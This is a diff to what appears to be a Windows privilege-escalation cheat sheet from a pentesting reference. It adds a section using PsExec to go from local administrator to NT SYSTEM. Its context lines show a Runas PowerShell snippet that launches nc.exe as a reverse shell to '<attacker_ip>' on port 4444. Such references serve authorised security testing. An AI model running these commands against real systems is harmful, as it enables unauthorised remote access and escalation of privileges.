@@ -15,6 +15,7 @@
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Runas](#eop---runas)
+* [EoP - From local administrator to NT SYSTEM](#eop---from-local-administrator-to-nt-system)
 * [EoP - Living Off The Land Binaries and Scripts](#eop---living-off-the-land-binaries-and-scripts)
 * [EoP - Common Vulnerabilities and Exposures](#eop---common-vulnerabilities-and-exposure)
   * [Token Impersonation (RottenPotato)](#token-impersonation-rottenpotato)
@@ -629,6 +630,12 @@ $ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
 $ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
 $ computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
+```
+
+## EoP - From local administrator to NT SYSTEM
+
+```powershell
+PsExec.exe -i -s cmd.exe
 ```
 
 ## EoP - Living Off The Land Binaries and Scripts
